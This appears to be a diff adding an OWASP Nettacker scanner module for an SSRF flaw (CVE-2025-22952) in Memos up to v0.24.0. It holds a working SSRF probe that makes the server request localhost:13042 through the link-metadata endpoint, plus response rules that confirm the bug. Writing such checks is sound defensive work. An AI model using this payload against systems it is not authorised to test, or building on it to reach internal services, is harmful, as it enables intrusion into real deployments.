@@ -1,0 +1,57 @@
+info:
+  name: memos_cve_2025_22952_ssrf_vuln
+  author: Nettacker Team 
+  severity: 9.8
+  description: >
+    Elestio Memos <= v0.24.0 is vulnerable to Server-Side Request Forgery (SSRF)
+    via the /api/v1/markdown/link:metadata endpoint due to insufficient URL validation.
+  reference:
+    - https://github.com/advisories/GHSA-wfxg-v3j4-7qmj
+    - https://github.com/usememos/memos/issues/4413
+    - https://github.com/usememos/memos/pull/4428
+  profiles:
+    - vuln
+    - http
+    - ssrf
+    - cve
+    - cve_2025
+    - memos
+    - critical_severity
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/markdown/link:metadata?link=http://localhost:13042"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - http
+                - https
+              ports:
+                - 5230
+                - 80
+                - 443
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "500"
+              reverse: false
+            content:
+              regex: "(?s)(?=.*localhost:13042)(?=.*connect: connection refused)"
+              reverse: false
+            headers:
+              content-type:
+                regex: "application/json"
+                reverse: false
